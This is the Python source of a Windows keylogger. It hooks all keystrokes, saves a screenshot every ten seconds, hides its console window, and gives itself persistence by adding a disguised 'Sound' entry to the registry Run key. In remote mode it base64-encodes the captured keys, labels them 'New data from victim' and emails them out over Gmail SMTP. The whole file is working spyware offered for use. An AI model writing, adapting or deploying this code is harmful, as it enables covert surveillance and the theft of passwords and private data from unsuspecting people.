## Importing packages and modules
import pythoncom
import pyHook
import os
import sys
import win32event, win32api, winerror
from winreg import *
import pyautogui
import time
import _thread
import datetime
import smtplib,base64

try:
    ## Set mutex lock
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
    if (win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS):
        mutex = None
        print ("Multiple Instance not Allowed")
        exit(0)

    ## Create a folder named lib for storing screenshots
    if not os.path.exists("lib"):
        os.makedirs("lib")

    ## Initializing variables
    x=''
    data=''
    direc=''
    data_send=''
    count=0
    your_email = ''
    your_pass = ''
    send_email = ''


    ## Function for sending email
    def Mail_it(data):
        global your_email , send_email, your_pass
        data_byte = data.encode("utf-8")
        data = base64.b64encode(data_byte)
        data = str(data)
        data = 'New data from victim(Base64 encoded)\n' + data
        print("data after encoding:",data)
        print ("data is going to:",your_email)
        print("data is send to:",send_email)
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(your_email, your_pass)
        server.sendmail(your_email, send_email, data)
        server.close()


    ## Function for creating a batch file
    def bat():
        global direc
        direc = os.path.dirname(os.path.realpath(__file__))
        code = ''
        fp = open("Sound.bat","w")
        if x==0:
            #print (direc)
            code = 'START cmd.exe /k "cd '+direc+' & python Audio.py local"'
            #code= 'START cmd.exe /k "cd C:\\Users\\Vbox\\Desktop\\Python & python Audio.py local"'
        elif x==3:
            code = 'START cmd.exe /k "cd '+direc+' & python Audio.py remote"'
            #code= 'START cmd.exe /k "cd C:\\Users\\Vbox\\Desktop\\Python & python Audio.py remote"'
        fp.write(code)
        addStartup()

    ## Function for taking screenshots
    def screenshot(name):
        now = datetime.datetime.now()
        #print("Taking Pic from thread:", name)
        foldername = 'lib\\'
        shotname = str(now.strftime("%Y-%m-%d %H%M "))
        sec = str(now)[-9:-7]
        #print(shotname + sec)
        pyautogui.screenshot().save(foldername+shotname+sec+' shot'+ '.png')
        
    ## Taking screenshots after 1 sec
    def timeer(name):
        _thread.start_new_thread( screenshot, ("Thread-2", ) )
        time.sleep(10)
        #print("Inside Timeer Name:",name)
        timeer(name)

        
    def msg():
        print ('''\nThis is the simple message which runs when no input is provided\n''')



    def hide():
        import win32console,win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window,0)
        return True


    ## Function for setting things in the windows registry 
    def addStartup():
        global direc
        new_file_path = direc+"\\"+"Sound.bat"
        #print("**********",new_file_path,"*************")
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

        key2change = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)

        SetValueEx(key2change, "Sound",0,REG_SZ, new_file_path)


    ## Creating Amp.txt named file for storing user data
    def local():
        global data
        if len(data)>100:
            fp = open("Amp.txt","a")
            fp.write(data)
            fp.close()
            return True
        data=''


    ## Sending mail after every 1000 words
    def remote():
        global data
        global data_send
        data_send += data
        if len(data_send)>1000:
            print("data_send: ",data_send)
            _thread.start_new_thread(Mail_it,(data_send,))
            data_send = ''
        data=''
        

    ## Getting special key values
    def keypressed(event):
        global x,data
        print("event:",event)
        print(event.KeyID)
        if (event.KeyID == 13):
            keys='<ENTER>'
        elif (event.KeyID == 8):
            keys='<BACK SPACE>'
        elif (event.KeyID == 9):
            keys='<TAB>'
        elif(event.KeyID == 20):
            keys = '<CAPS>'
        elif(event.KeyID == 160):
            keys = '<SWIFT>'
        else:
            keys = chr(event.KeyID)
        data = data+keys
        print("Keys:",keys)
        if len(data)>100:
            if x==1:
                local()
            elif x==2:
                remote()


    ## Main function
    def main():
            global x
            if len(sys.argv) == 1:
                x = 0
                msg()
                bat()
                addStartup()
                x = 1
                hide()
                _thread.start_new_thread( timeer, ("Thread-1", ) )
            else:
                if len(sys.argv)>2:
                    if sys.argv[2]=='startup':
                        bat()
                if sys.argv[1] =="local":
                    x = 1
                    hide()
                    _thread.start_new_thread( timeer, ("Thread-1", ) )
                elif sys.argv[1] =="remote":
                    x = 2
                    hide()
                elif sys.argv[1] =="email":
                    x = 3
                    bat()
                    addStartup()
                    x=2
                    hide()
                else:
                    msg()
                    exit(0)
            return True


    if __name__  == '__main__':
        main()
        obj = pyHook.HookManager()
        obj.KeyDown = keypressed
        obj.HookKeyboard()
        pythoncom.PumpMessages()
except Exception as e:
    print(e)